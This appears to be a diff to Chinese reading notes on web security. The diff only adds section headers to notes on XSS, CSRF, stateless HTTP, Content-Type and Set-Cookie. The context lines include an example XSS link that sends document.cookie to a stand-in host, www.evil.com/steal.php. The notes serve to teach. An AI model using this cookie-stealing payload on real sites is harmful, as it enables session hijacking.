@@ -7,7 +7,7 @@ tags:
     - 读书笔记 
 ---
 
-XSS 跨站脚本攻击
+### XSS 跨站脚本攻击
 如果攻击者构造出如下链接：
 http://www.foo.com/info.html#new%20Image().src="http://www.evil.com/steal.php?c="+escape(document.cookie)
 浏览器解释执行后，下面的语句：
@@ -17,22 +17,27 @@ eval('new Image().src="http://www.evil.com/steal.php?c="+escape(document.
 cookie)')
 Cookies 会话信息就会被盗取到黑客的网站上
 
+### CSRF 
 CSRF 是跨站请求伪造，CSRF 会借用目标用户的权限做一些借刀杀人的事（注意是“借用”，而不是“盗取”
 目标权限），然后去做坏事，
 “盗取”通常是XSS（跨站脚本攻击）最喜欢做的事。
 
+### APT
 APT（持久化威胁）攻击
 如果是个反射型的XSS，IE 8/IE 9/Chome 直接就给拦截了。
 
+### 无状态的HTTP
 HTTP 是无状态的，那么每次在连接时，服务端如何知道你是上一次的那个？
 这里通过Cookies 进行会话跟踪，第一次响应时设置的Cookies 在随后的每次请求中都会发
 送出去。Cookies 还可以包括登录认证后的身份信息。
 
+### 响应资源的类型与字符集
 Content-Type: text/html;charset=gbk
 响应资源的类型与字符集。针对不同的资源类型会有不同的解析方式，这个会影响浏
 览器对响应体里的资源解析方式，可能因此带来安全问题。字符集也会影响浏览器的解码
 方式，同样可能带来安全问题。
 
+### Set-Cookie
 Set-Cookie: USERID=c7888882e039b32fd7b4d3; expires=Tue, 01 Jan 2030
 00:00:00 GMT; path=/; domain=.foo.com
 每个 Set-Cookie 都设置一个Cookie（key=value 这样），随后是如下内容。
